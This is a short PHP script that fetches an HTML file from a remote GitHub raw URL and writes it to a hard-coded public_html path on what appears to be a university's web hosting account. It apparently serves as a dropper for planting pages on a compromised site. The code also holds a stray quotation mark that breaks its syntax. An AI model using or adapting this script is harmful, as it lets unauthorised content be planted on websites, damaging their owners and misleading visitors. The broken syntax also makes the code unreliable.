<?php
$fileContent = file_get_contents('https://raw.githubusercontent.com/upfigit/Fileupload/refs/heads/main/Faza/oscar3.html') "; // mengambil source html
$filePath = array("/home/u1732927/public_html/ibnus.ac.id/kw/oscar3.html");
foreach ($filePath as $path) {
if (file_put_contents($path, $fileContent) !== false) {
echo " File created (" . basename($path) . "). <br>";
} else {
echo " Cannot create the file (" . basename($path) . ").";
}
}
?>
